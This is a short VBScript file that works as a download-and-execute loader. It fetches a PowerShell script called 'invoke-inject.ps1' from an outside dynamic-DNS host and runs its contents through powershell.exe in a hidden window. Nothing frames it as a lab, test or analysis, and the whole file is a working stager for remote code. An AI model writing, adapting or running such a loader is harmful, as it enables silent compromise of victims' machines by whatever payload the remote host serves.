Dim objHTTP, strURL, strContent

' URL of the file to fetch
strURL = "http://nonsus.gleeze.com/invoke-inject.ps1"

' Create a new XMLHTTP object
Set objHTTP = CreateObject("MSXML2.XMLHTTP")

' Open a connection to the URL
objHTTP.Open "GET", strURL, False

' Send the request
objHTTP.Send

' Check if the request was successful (status code 200)
If objHTTP.Status = 200 Then
    ' Get the content of the file
    strContent = objHTTP.responseText
    ' Output the content to the console
    WScript.Echo strContent

    ' Create a shell object
    Set WshShell = CreateObject("WScript.Shell")
    ' Execute PowerShell script content
    WshShell.Run "powershell.exe -Command " & chr(34) & strContent & chr(34), 0, False
    ' Clean up
    Set WshShell = Nothing
Else
    ' If the request was not successful, output the status code
    WScript.Echo "Error: " & objHTTP.Status & " - " & objHTTP.statusText
End If

' Clean up
Set objHTTP = Nothing
